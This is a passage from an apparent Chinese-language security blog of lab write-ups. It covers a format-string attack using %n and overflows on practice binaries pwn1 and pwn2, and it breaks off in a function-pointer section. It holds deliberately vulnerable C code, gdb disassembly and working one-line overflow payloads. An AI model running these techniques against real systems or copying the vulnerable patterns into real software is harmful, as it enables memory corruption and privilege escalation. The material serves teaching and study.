中</p><p>2，运用同样的方法在访问任意地址内存的时候，我们可以将一个数字写入指定的内存中。只要将%s替换成%n就能够覆盖0×10014808的内容。</p><p>3，利用这个方法，攻击者可以做以下事情:</p><p>重写程序标识控制访问权限</p><p>重写栈或者函数等等的返回地址</p><p>4，然而，写入的值是由%n之前的字符数量决定的。真的有办法能够写入任意数值么？</p><p>用最古老的计数方式， 为了写1000，就填充1000个字符吧。</p><p>为了防止过长的格式字符串，我们可以使用一个宽度指定的格式指示器。(比如（%0数字x）就会左填充预期数量的0符号)</p><h2 id="利用格式化字符串漏洞"><a href="#利用格式化字符串漏洞" class="headerlink" title="利用格式化字符串漏洞"></a>利用格式化字符串漏洞</h2><p>用户需要输入一段数据，数据保存在user_input数组中，程序会使用printf函数打印数据内容，并且该程序以root权限运行。这个程序存在一个格式化漏洞。</p><p>程序内存中存在两个秘密值，我们想要知道这两个值，但发现无法通过读二进制代码的方式来获取它们（实验中为了简单起见，硬编码这些秘密值为0x44和0x55）。尽管我们不知道它们的值，但要得到它们的内存地址倒不是特别困难，因为对大多数系统而言，每次运行程序，这些内存地址基本上是不变的。实验假设我们已经知道了这些内存地址，为了达到这个目的，程序特意为我们打出了这些地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* vul_prog.c */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> SECRET1 0x44</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> SECRET2 0x55</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="type">char</span> user_input[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span> *secret;</span><br><span class="line"></span><br><span class="line">      <span class="type">long</span> int_input;</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span> a, b, c, d; <span class="comment">/* other variables, not used here.*/</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The secret value is stored on the heap */</span></span><br><span class="line"></span><br><span class="line">      secret = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* getting the secret */</span></span><br><span class="line"></span><br><span class="line">      secret[<span class="number">0</span>] = SECRET1; secret[<span class="number">1</span>] = SECRET2;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The variable secret&#x27;s address is 0x%8x (on stack)\n&quot;</span>, &amp;secret);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The variable secret&#x27;s value is 0x%8x (on heap)\n&quot;</span>, secret);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;secret[0]&#x27;s address is 0x%8x (on heap)\n&quot;</span>, &amp;secret[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;secret[1]&#x27;s address is 0x%8x (on heap)\n&quot;</span>, &amp;secret[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter a decimal integer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;int_input);  <span class="comment">/* getting an input from user */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter a string\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, user_input); <span class="comment">/* getting a string from user */</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Vulnerable place */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(user_input); </span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Verify whether your attack is successful */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The original secrets: 0x%x -- 0x%x\n&quot;</span>, SECRET1, SECRET2);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The new secrets:      0x%x -- 0x%x\n&quot;</span>, secret[<span class="number">0</span>], secret[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实验环境是64位系统，所以需要使用%016llx才能读取整个字。</p><p><strong>找出secret[0]的值</strong></p><p>1.首先定位int_input的位置，这样就确认了％s在格式字符串中的位置。</p><p><img src="/.io//image-20240208163758538.png" alt="image-20240208163758538"></p><p>2.输入secret[0]的地址，记得做进制转换(22003732)，同时在格式字符串中加入％s。</p><p><img src="/.io//image-20240208163850544.png" alt="image-20240208163850544"></p><p>获取到D–0x44。</p><p>3.修改为任意值</p><p><img src="/.io//image-20240208164657715.png" alt="image-20240208164657715"></p><p>其中，%.880u限定了字符零填充到880个大小，%n往目标地址写入在此之前的字符数量</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWN实战</title>
      <link href="/2024/03/09/PWN%E5%AE%9E%E6%88%98/"/>
      <url>/2024/03/09/PWN%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h1 id="一般溢出"><a href="#一般溢出" class="headerlink" title="一般溢出"></a>一般溢出</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>主机&#x2F;home&#x2F;test&#x2F;1目录下有一个pwn1程序，执行这个程序的时候可以输入数据进行测试，pwn1程序会输出Please try again.的提示信息，请对pwn1程序进行逆向分析和调试，找到程序内部的漏洞，并构造特殊的输入数据，使之输出Congratulations, you pwned it.信息。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> modified;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    modified = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">gets</span>(buffer);        <span class="comment">// 引发缓冲区溢出</span></span><br><span class="line">    <span class="keyword">if</span> (modified != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulations, you pwned it.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please try again.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用gets函数读取输入数据时，并不会对buffer缓冲区的长度进行检查，输入超长的输入数据时会引发缓冲区溢出。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>gdb调试器</p><p><img src="/.io//image-20240208170500645.png" alt="image-20240208170500645"></p><p>执行gdb pwn1即可开始通过gdb对pwn1进行调试，现在我们需要阅读main函数的汇编代码，在gdb中执行disas main命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb pwn1</span><br><span class="line">disas main</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208174004328.png" alt="image-20240208174004328"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">0x080482a0 &lt;+0&gt;:   push   %ebp</span><br><span class="line"></span><br><span class="line">0x080482a1 &lt;+1&gt;:   mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">0x080482a3 &lt;+3&gt;:   and    $0xfffffff0,%esp</span><br><span class="line"></span><br><span class="line">; esp = esp - 0x60，即在栈上分配0x60）字节的空间</span><br><span class="line"></span><br><span class="line">0x080482a6 &lt;+6&gt;:   sub    $0x60,%esp</span><br><span class="line"></span><br><span class="line">; modified变量位于esp + 0x5C处，将其初始化为0</span><br><span class="line"></span><br><span class="line">0x080482a9 &lt;+9&gt;:   movl   $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; buffer位于esp + 0x1C处</span><br><span class="line"></span><br><span class="line">0x080482b1 &lt;+17&gt;:  lea    0x1c(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x080482b5 &lt;+21&gt;:  mov    %eax,(%esp)</span><br><span class="line"></span><br><span class="line">; 调用gets(buffer)读取输入数据</span><br><span class="line"></span><br><span class="line">0x080482b8 &lt;+24&gt;:  call   0x8049360 &lt;gets&gt;</span><br><span class="line"></span><br><span class="line">; 判断modified变量的值是否是0</span><br><span class="line"></span><br><span class="line">0x080482bd &lt;+29&gt;:  cmpl   $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; 如果modified的值等于0，就跳转到 0x080482d2</span><br><span class="line"></span><br><span class="line">0x080482c2 &lt;+34&gt;:  je     0x80482d2 &lt;main+50&gt;</span><br><span class="line"></span><br><span class="line">; modified不为0，打印成功提示</span><br><span class="line"></span><br><span class="line">0x080482c4 &lt;+36&gt;:  movl   $0x80b3eec,(%esp)</span><br><span class="line"></span><br><span class="line">0x080482cb &lt;+43&gt;:  call   0x8049500 &lt;puts&gt;</span><br><span class="line"></span><br><span class="line">0x080482d0 &lt;+48&gt;:  jmp    0x80482de &lt;main+62&gt;</span><br><span class="line"></span><br><span class="line">; modified为0，打印失败提示</span><br><span class="line"></span><br><span class="line">0x080482d2 &lt;+50&gt;:  movl   $0x80b3f0b,(%esp)</span><br><span class="line"></span><br><span class="line">0x080482d9 &lt;+57&gt;:  call   0x8049500 &lt;puts&gt;</span><br><span class="line"></span><br><span class="line">0x080482de &lt;+62&gt;:  mov    $0x0,%eax</span><br><span class="line"></span><br><span class="line">0x080482e3 &lt;+67&gt;:  leave</span><br><span class="line"></span><br><span class="line">0x080482e4 &lt;+68&gt;:  ret</span><br></pre></td></tr></table></figure><p>通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1C处，而modified位于esp+0x5C处，两个地址的距离为0x5C - 0x1C &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当我们输入的数据超过64字节时，modified变量就可以被覆盖。</p><p>下面在gdb中进行验证，在gdb中执行b *0x080482bd命令对gets的下一条指令下一个断点，执行r命令，让被调试的pwn1程序跑起来，就可以输入数据进行测试了，这里我们输入64个A以及1个B（即 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB），按下 Enter键程序就在断点处断下了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *0x080482bd</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208174346300.png" alt="image-20240208174346300"></p><p>在gdb中输入x $esp+0x5C，查看modified变量的值已经被修改成了0x00000042，而0x42就是字符’B’的ASCII值，表明我们成功用输入数据的第65个字节覆盖了modified变量：</p><p>在gdb中连续多次执行ni命令，可以看到je指令没有跳转，说明modified的值不为0，程序进入输出通过信息的if语句分支：</p><p><img src="/.io//image-20240208174609847.png" alt="image-20240208174609847"></p><p>使用c命令让程序执行下去。</p><p>下面我们就可以通过构造输入数据进行攻击了。输入q命令就可以退出gdb，ctrl+L清空当前命令窗口。</p><p>通过python语句构造输入数据，然后通过管道传给pwn1程序，执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27;*64+&#x27;B&#x27;&quot;</span> | ./pwn1</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208174843897.png" alt="image-20240208174843897"></p><p>成功通过。</p><h1 id="精确覆盖变量数据"><a href="#精确覆盖变量数据" class="headerlink" title="精确覆盖变量数据"></a>精确覆盖变量数据</h1><h2 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h2><p>  C语言的main函数拥有两个参数，为int类型的argc参数，以及char**类型argv参数。其中argc参数的值表示命令行参数的个数，而argv则指向一个字符串数组，该数组存储了具体的命令行参数的内容。注意程序本身的名字为命令行的第一个参数。</p><p>   打印命令行参数信息的示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; ++i)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv[%d] = %s\n&quot;</span>, i, argv[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这段代码生成test程序，然后在命令行下执行，尝试传入命令行参数，如：.&#x2F;test hello world cmdline，可以看到程序打印出具体的命令行参数信息。</p><p><img src="/.io//image-20240208203000662.png" alt="image-20240208203000662"></p><p>Linux的<strong>xargs</strong>命令可以将输入数据当做命令行参数传给指定的程序。比如执行命令python -c “print ‘AAA BBB CCC’” | xargs .&#x2F;test后，输出：</p><p><img src="/.io//image-20240208202932277.png" alt="image-20240208202932277"></p><p> python语句执行后输出AAA BBB CCC，通过管道操作作为xargs命令的输入，而xargs将其作为test程序的命令行参数，因此test程序会把这些信息打印出来。</p><p>小端序</p><p><img src="/.io//image-20240208203105302.png" alt="image-20240208203105302"></p><p>主机&#x2F;home&#x2F;test&#x2F;2目录下有一个pwn2程序，这个程序会对传入的命令行参数进行处理，通过构造特定的命令行参数数据可以对程序发起溢出攻击，成功会提示Congratulations, you pwned it.，失败则会提示Please try again.的提示信息。</p><h2 id="利用缓冲区溢出改写变量的值"><a href="#利用缓冲区溢出改写变量的值" class="headerlink" title="利用缓冲区溢出改写变量的值"></a>利用缓冲区溢出改写变量的值</h2><p>执行gdb pwn2即可开始通过gdb对pwn2进行调试，现在我们需要阅读main函数的汇编代码，在gdb中执行disas main命令：</p><p><img src="/.io//image-20240208203619828.png" alt="image-20240208203619828"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">0x080482a0 &lt;+0&gt;:    push   %ebp</span><br><span class="line"></span><br><span class="line">0x080482a1 &lt;+1&gt;:    mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">0x080482a3 &lt;+3&gt;:    and    $0xfffffff0,%esp</span><br><span class="line"></span><br><span class="line">; esp = esp - 0x60，即在栈上分配0x60）字节的空间</span><br><span class="line"></span><br><span class="line">0x080482a6 &lt;+6&gt;:    sub    $0x60,%esp</span><br><span class="line"></span><br><span class="line">; 判断命令行参数的个数是否为1</span><br><span class="line"></span><br><span class="line">0x080482a9 &lt;+9&gt;:    cmpl   $0x1,0x8(%ebp)</span><br><span class="line"></span><br><span class="line">0x080482ad &lt;+13&gt;:   jne    0x80482c7 &lt;main+39&gt;</span><br><span class="line"></span><br><span class="line">0x080482af &lt;+15&gt;:   movl   $0x80b3dac,(%esp)</span><br><span class="line"></span><br><span class="line">0x080482b6 &lt;+22&gt;:   call   0x80493c0 &lt;puts&gt;</span><br><span class="line"></span><br><span class="line">0x080482bb &lt;+27&gt;:   movl   $0x1,(%esp)</span><br><span class="line"></span><br><span class="line">0x080482c2 &lt;+34&gt;:   call   0x8048e90 &lt;exit&gt;</span><br><span class="line"></span><br><span class="line">; 命令参数个数不是1，说明传入了命令行参数</span><br><span class="line"></span><br><span class="line">; modified变量位于esp + 0x5C处，将其初始化为0</span><br><span class="line"></span><br><span class="line">0x080482c7 &lt;+39&gt;:   movl   $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; 通过ebp + 0xC获取argv参数的值</span><br><span class="line"></span><br><span class="line">0x080482cf &lt;+47&gt;:   mov    0xc(%ebp),%eax</span><br><span class="line"></span><br><span class="line">; eax = eax + 4</span><br><span class="line"></span><br><span class="line">0x080482d2 &lt;+50&gt;:   add    $0x4,%eax</span><br><span class="line"></span><br><span class="line">; 取argv[1]的值</span><br><span class="line"></span><br><span class="line">0x080482d5 &lt;+53&gt;:   mov    (%eax),%eax</span><br><span class="line"></span><br><span class="line">; 将argv[1]作为strcpy的第二个参数值</span><br><span class="line"></span><br><span class="line">0x080482d7 &lt;+55&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line"></span><br><span class="line">; buffer位于esp + 0x1C处，buffer作为strcpy的第一个参数值</span><br><span class="line"></span><br><span class="line">0x080482db &lt;+59&gt;:   lea    0x1c(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x080482df &lt;+63&gt;:   mov    %eax,(%esp)</span><br><span class="line"></span><br><span class="line">; 调用strcpy进行字符串复制</span><br><span class="line"></span><br><span class="line">0x080482e2 &lt;+66&gt;:   call   0x80525b0 &lt;strcpy&gt;</span><br><span class="line"></span><br><span class="line">; 判断modified的值是否为0x61626364</span><br><span class="line"></span><br><span class="line">0x080482e7 &lt;+71&gt;:   cmpl   $0x61626364,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; 不相等则跳转并输出失败信息</span><br><span class="line"></span><br><span class="line">0x080482ef &lt;+79&gt;:   jne    0x80482ff &lt;main+95&gt;</span><br><span class="line"></span><br><span class="line">; 输出成功提示信息</span><br><span class="line"></span><br><span class="line">0x080482f1 &lt;+81&gt;:   movl   $0x80b3dc8,(%esp)</span><br><span class="line"></span><br><span class="line">0x080482f8 &lt;+88&gt;:   call   0x80493c0 &lt;puts&gt;</span><br><span class="line"></span><br><span class="line">0x080482fd &lt;+93&gt;:   jmp    0x8048314 &lt;main+116&gt;</span><br><span class="line"></span><br><span class="line">0x080482ff &lt;+95&gt;:   mov    $0x80b3de8,%eax</span><br><span class="line"></span><br><span class="line">0x08048304 &lt;+100&gt;:  mov    0x5c(%esp),%edx</span><br><span class="line"></span><br><span class="line">0x08048308 &lt;+104&gt;:  mov    %edx,0x4(%esp)</span><br><span class="line"></span><br><span class="line">0x0804830c &lt;+108&gt;:  mov    %eax,(%esp)</span><br><span class="line"></span><br><span class="line">0x0804830f &lt;+111&gt;:  call   0x8049390 &lt;printf&gt;</span><br><span class="line"></span><br><span class="line">0x08048314 &lt;+116&gt;:  mov    $0x0,%eax</span><br><span class="line"></span><br><span class="line">0x08048319 &lt;+121&gt;:  leave</span><br><span class="line"></span><br><span class="line">0x0804831a &lt;+122&gt;:  ret</span><br></pre></td></tr></table></figure><p>通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1C处，而modified位于esp+0x5C处，两个地址的距离为0x5C - 0x1C &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当我们输入的数据超过64字节时，modified变量就可以被覆盖，但需要控制modified变量的值还需要小心的构造命令行参数。</p><p>下面在gdb中进行验证，在gdb中执行b * 0x080482e7命令对strcpy的下一条指令下一个断点</p><p>在gdb中执行r命令，如下（r后面的数据为64个A以及1234）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234 </span><br></pre></td></tr></table></figure><p>即r命令后加上空格可以接一个命令行参数，用于传递给被调试的程序。按下Enter键程序就在断点处断下了：</p><p><img src="/.io//image-20240208204344435.png" alt="image-20240208204344435"></p><p>变量值已被修改。</p><p> 使用x &#x2F;4xb $esp+0x5C命令，以字节为单位查看内存中0x34333231的表示（其中&#x2F;4xb用于控制输出格式，4表示4个长度单位，x表示以16进制方式显示，b表示单位为字节）：</p><p><img src="/.io//image-20240208204517047.png" alt="image-20240208204517047"></p><p>现在modified变量的值已经被修改成0x34333231了，结合我们的输入数据‘A….A1234’，1234为低地址往高地址方向，可以判断这是小端格式的表示法。</p><p>在gdb中输入c命令就可以让程序继续执行，看到输出了错误的提示信息：</p><p><img src="/.io//image-20240208204548983.png" alt="image-20240208204548983"></p><p>现在我们只要合理控制命令行参数的第65~68字节的内容，就可以成功发起溢出攻击了。q退出gdb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27;*64+&#x27;\x64\x63\x62\x61&#x27;&quot;</span> | xargs ./pwn2</span><br></pre></td></tr></table></figure><p>使用管道方式传参数，pwn程序。</p><p><img src="/.io//image-20240208204738100.png" alt="image-20240208204738100"></p><h1 id="函数指针覆盖"><a href="#函数指针覆盖" class="headerlink" title="函数指针覆盖"></a>函数指针覆盖</h1><h2 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h2><p>使用objdump工具可以查看一个目标文件的许多内部信息，objdump有许多可选的参数选项，通过控制这些参数选项可以输出不同的文件信息。在对二进制程序进行分析时，我们可以使用objdump获取二进制程序中代码段的反汇编指令列表，从而获取某一个函数的具体地址信息。</p><p>执行objdump -d pwn4可以看到关于pwn4程序的反汇编指令列表，其中-d选项表示进行反汇编操作。</p><p>函数指针（Function Pointer）是指向函数的指针，函数指针可以像一般函数一样，用于调用函数、传递参数。在C &#x2F;C++这样的语言中，通过提供一个简单的选取、执行函数的方法，函数指针可以简化代码。</p><p>   函数指针只能指向具有特定特征的函数，因而所有被同一指针运用的函数必须具有相同的参数和返回类型。</p><p>   通常使用typedef来定义一个函数指针类型，如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*func)</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>  定义了func这样的函数指针类型，其可以指向返回值类型为void且没有函数参数的函数，比如void test()这样的函数，可以使用func myfp &#x3D; test;来定义一个myfp变量，该变量指向test函数，通过执行myfp()可以达到执行test()函数同样的效果。</p><p>主机&#x2F;home&#x2F;test&#x2F;4目录下有一个pwn4程序，执行这个程序可以输入数据进行测试，当输入一定的数据量时，可能什么都不会提示程序就结束运行了，也可能会提示这样的信息：</p><p>calling function pointer, jumping to 0x41414141</p><p>Segmentation fault</p><p>当输入的精心构造的输入数据时可对程序发起溢出攻击，达到改写程序执行流程的目的，攻击成功时将输出如下信息：</p><p>calling function pointer, jumping to 0xXXXXXXXX</p><p>Congratulations, you pwned 